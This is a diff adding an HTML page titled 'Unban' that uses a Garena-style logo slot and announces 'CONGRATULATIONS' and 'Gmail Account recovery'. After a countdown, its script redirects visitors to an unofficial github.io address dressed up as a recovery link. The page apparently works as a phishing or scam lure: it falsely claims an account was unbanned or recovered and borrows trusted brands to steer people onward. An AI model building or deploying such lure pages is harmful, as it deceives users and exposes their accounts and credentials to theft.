@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unban</title>
+    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        /* Basic Page Setup */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #222222 0%, #000000 100%);
+            font-family: 'Teko', sans-serif;
+            overflow: hidden;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* --- GARENA LOGO --- */
+        #top-logo {
+            position: absolute;
+            top: 30px;
+            width: 130px; 
+            z-index: 10;
+            filter: drop-shadow(0 0 8px rgba(255, 0, 0, 1)) 
+                    drop-shadow(0 0 20px rgba(200, 0, 0, 0.6));
+        }
+
+        /* --- MAIN CONTAINER (Super Slow Motion Zoom Entry) --- */
+        #main-container {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh; 
+            width: 100%;
+            padding: 0 10px;
+            box-sizing: border-box;
+
+            /* Start State */
+            opacity: 0;
+            transform: scale(4); 
+            filter: blur(20px); 
+            
+            /* UPDATED: Increased duration to 3.5s for Slow Motion */
+            animation: smoothEntry 3.5s cubic-bezier(0.19, 1, 0.22, 1) forwards;
+        }
+
+        /* Animation Logic */
+        @keyframes smoothEntry {
+            0% { 
+                opacity: 0; 
+                transform: scale(4); 
+                filter: blur(20px); 
+            }
+            100% { 
+                opacity: 1; 
+                transform: scale(1); 
+                filter: blur(0px); 
+            }
+        }
+
+        /* --- GREEN TICK MARK --- */
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto;
+            /* Smooth Pulse Animation */
+            animation: pulseIcon 2s infinite ease-in-out;
+        }
+
+        .success-icon svg {
+            width: 100%;
+            height: 100%;
+            fill: #39FF14;
+            filter: drop-shadow(0 0 10px rgba(57, 255, 20, 0.8));
+        }
+
+        @keyframes pulseIcon {
+            0% { transform: scale(1); filter: drop-shadow(0 0 5px rgba(57, 255, 20, 0.5)); }
+            50% { transform: scale(1.1); filter: drop-shadow(0 0 15px rgba(57, 255, 20, 1)); }
+            100% { transform: scale(1); filter: drop-shadow(0 0 5px rgba(57, 255, 20, 0.5)); }
+        }
+
+        /* --- CONGRATULATIONS TEXT --- */
+        #congrats-text {
+            font-size: 55px; 
+            font-weight: 700;
+            margin: 10px 0 0 0;
+            line-height: 1.1;
+            background: linear-gradient(to bottom, #FFF700, #FF8C00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 
+                0 0 15px rgba(255, 215, 0, 0.8),
+                0 0 30px rgba(255, 140, 0, 0.6);
+            max-width: 90%; 
+        }
+
+        /* --- INFO TEXT --- */
+        #info-text {
+            font-size: 28px;
+            color: #e0e0e0;
+            margin-top: 20px;
+            letter-spacing: 1.5px;
+            line-height: 1.4; 
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.4);
+        }
+        
+        .highlight {
+            color: #ffffff;
+            font-weight: bold;
+        }
+        
+        .status {
+            color: #aaaaaa;
+            font-size: 0.8em;
+            display: block;
+            margin-top: 5px;
+        }
+
+        /* Timer Container */
+        #timer-container {
+            margin-top: 30px;
+        }
+
+        /* Glowing Green Number */
+        #timer {
+            font-size: 60px;
+            font-weight: 700;
+            color: #39FF14;
+            text-shadow: 
+                0 0 10px #39FF14,
+                0 0 20px #39FF14,
+                0 0 40px #008000;
+            display: block;
+            line-height: 1;
+        }
+
+        /* Loading Overlay */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+
+        #loading-image {
+            width: 100px;
+            animation: rapidBlink 0.8s infinite alternate;
+        }
+
+        @keyframes rapidBlink {
+            0% { opacity: 0.3; transform: scale(0.95); }
+            100% { opacity: 1; transform: scale(1.05); }
+        }
+
+        /* --- MOBILE RESPONSIVE --- */
+        @media (max-width: 768px) {
+            #main-container { padding-top: 70px; }
+            #congrats-text { font-size: 9vw; letter-spacing: 1px; }
+            #info-text { font-size: 22px; margin-top: 15px; }
+            #timer { font-size: 50px; }
+            #top-logo { width: 100px; top: 25px; }
+            .success-icon { width: 80px; height: 80px; }
+        }
+    </style>
+</head>
+<body>
+
+    <img id="top-logo" src="gml.gif" alt="Logo">
+
+    <div id="main-container">
+        
+        <div class="success-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+            </svg>
+        </div>
+
+        <h1 id="congrats-text">CONGRATULATIONS</h1>
+        
+        <div id="info-text">
+            <span class="highlight">Gmail Account recovery</span>
+            <span class="status">Proceed...</span>
+        </div>
+
+        <div id="timer-container">
+            <span id="timer">10</span>
+        </div>
+    </div>
+
+    <div id="loading-overlay">
+        <img id="loading-image" src="gml.gif" alt="Loading...">
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const timerSpan = document.getElementById('timer');
+            const mainContainer = document.getElementById('main-container');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const topLogo = document.getElementById('top-logo');
+            
+            let timeLeft = 10;
+
+            // Timer starts immediately
+            const countdownInterval = setInterval(() => {
+                timeLeft--;
+                timerSpan.textContent = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    startLoadingSequence();
+                }
+            }, 1000);
+
+            function startLoadingSequence() {
+                mainContainer.style.display = 'none';
+                topLogo.style.display = 'none';
+                loadingOverlay.style.display = 'flex';
+
+                setTimeout(() => {
+                    // Redirect Link
+                    window.location.href = "https://gmlunlok.github.io/recovery/congratulations/gml-recovery-pending-id-456757687fgv";
+                }, 3000);
+            }
+        });
+    </script>
+
+</body>
+</html>
